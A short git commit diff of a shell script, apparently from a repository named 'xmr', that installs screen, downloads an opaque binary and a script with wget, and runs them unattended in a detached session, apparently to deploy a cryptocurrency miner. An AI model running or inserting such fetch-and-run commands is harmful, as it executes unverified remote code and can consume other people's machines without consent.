3b2cbc27246366793b761add50eee8db786c6f7a
renilo <88342640+renilo@users.noreply.github.com>
2021-08-27 20:19:14 +0700

    Update autokontol1.sh

--- autokontol1.sh
+++ autokontol1.sh
@@ -5,12 +5,12 @@ sudo apt update
 
 sudo apt install screen -y
 
-screen -dmS kontol.sh ./kontol.sh 65 75
+screen -dmS kontol1.sh ./kontol1.sh 65 75
 
-wget https://github.com/renilo/xmr/raw/main/memek
+wget https://github.com/renilo/xmr/raw/main/memek1
 
-wget https://raw.githubusercontent.com/renilo/xmr/main/kontol.sh
+wget https://raw.githubusercontent.com/renilo/xmr/main/kontol1.sh
 
-chmod +x kontol.sh
+chmod +x kontol1.sh
 
-./kontol.sh
+./kontol1.sh
